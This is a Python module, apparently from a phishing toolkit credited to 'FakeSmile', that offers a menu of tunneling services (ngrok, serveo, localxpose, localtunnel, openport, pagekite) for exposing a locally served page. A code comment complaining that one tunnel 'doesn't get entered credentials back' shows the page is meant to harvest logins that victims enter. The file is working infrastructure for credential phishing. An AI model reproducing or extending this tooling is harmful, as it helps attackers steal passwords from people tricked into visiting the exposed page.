from Defs.ImportManager.unsorted_will_be_replaced import run_command
import Defs.ThemeManager.theme as theme
import Defs.ActionManager.Server.server_runner as server_runner
import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_menu as localization
import Defs.LocalizationManager.lang_global_usage as global_localization
import Defs.ActionManager.main_runner as main_runner

default_palette = theme.default_palette





def server_selection(port):  # Question where user must select server
    run_command('clear')
    #print('''
    #	    ████████                ██          ████████                 
    #	  ██░░░░░░██              ░██          ░██░░░░░   ██   ██        
    #	 ██      ░░   ██████      ░██  ██████  ░██       ░░██ ██   █████ 
    #	░██          ██░░░░██  ██████ ██░░░░   ░███████   ░░███   ██░░░██
    #	░██    █████░██   ░██ ██░░░██░░█████   ░██░░░░     ░██   ░███████
    #	░░██  ░░░░██░██   ░██░██  ░██ ░░░░░██  ░██         ██    ░██░░░░ 
    #	 ░░████████ ░░██████ ░░██████ ██████   ░████████  ██     ░░██████
    #	  ░░░░░░░░   ░░░░░░   ░░░░░░ ░░░░░░    ░░░░░░░░  ░░       ░░░░░░  
    #    {0}https://github.com/FakeSmileUX
    #    {0}** By:FakeSmile ** \n\n-------------------------------\n

    # )
    print(global_localization.gods_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_fakesmile)
    print(localization.lang_server_selection["server_selection"])
    print(localization.lang_server_selection["select_any_available_server"])
    main_runner.print_sorted_as_menu(localization.lang_server_selection["servers_list"])
    choice = input(global_localization.input_line)
    choice = choice.zfill(2)
    if choice == '00':
        run_command('clear')
        server_runner.start_localhost(port) #FIXED
    elif choice == '01':
        run_command('clear')
        server_runner.start_ngrok(port) # FIXED
    elif choice == '02':
        run_command('clear')
        server_runner.start_serveo(port) # ALMOST FIXED
    elif choice == '03':
        run_command('clear')
        server_runner.start_localxpose(port) # DOESN'T GET ENTERED CREDENTIALS BACK
    elif choice == '04':
        run_command('clear')
        server_runner.start_localtunnel(port, True)
    elif choice == '05':
        run_command('clear')
        server_runner.start_openport(port)
    elif choice == '06':
        run_command('clear')
        server_runner.start_pagekite(port)
    else:
        run_command('clear')
        return server_selection(port)
